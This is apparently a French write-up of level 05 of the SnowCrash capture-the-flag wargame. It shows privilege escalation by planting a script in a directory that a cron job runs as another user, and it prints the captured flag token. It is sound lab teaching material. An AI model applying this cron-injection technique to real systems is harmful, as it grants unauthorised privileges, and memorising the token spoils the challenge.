
# **Level 05**

Pour ce level05, nous n'avons rien dans le dossier courant donc nous cherchons dans la machine si il y a quelque chose se rapportant au niveau 5

```
level05@SnowCrash:~$ find / -name level05 2> /dev/null 
/var/mail/level05
/rofs/var/mail/level05
```

Dans `/var/mail/level05` nous pouvons voir une entree de `crontab` qui semble `executer` un script toutes les 2 minutes avec les droits de `flag05`

```
level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Le script `/usr/sbin/openarenaserver` semble `executer` tous les fichiers present dans le dossier `/opt/openarenaserver` puis les supprimer

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Donc nous mettons un script dans `/opt/openarenaserver` qui execute `getflag` et le print dans un fichier

```
level05@SnowCrash:/opt/openarenaserver$ echo "echo "$(getflag)" > /var/crash/flag" > exec.sh && chmod 777 exec.sh
```
> Il faut que le programme creer lui meme le fichier de sortie



Puis lorsque le cron s'execute

> */2 * * * * signifie au'il se lance toutes les 2 minutes

```
level05@SnowCrash:/opt/openarenaserver$ cat /var/crash/flag 
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

> ### NEXT : [Level 06](/level06/resources/README.md)
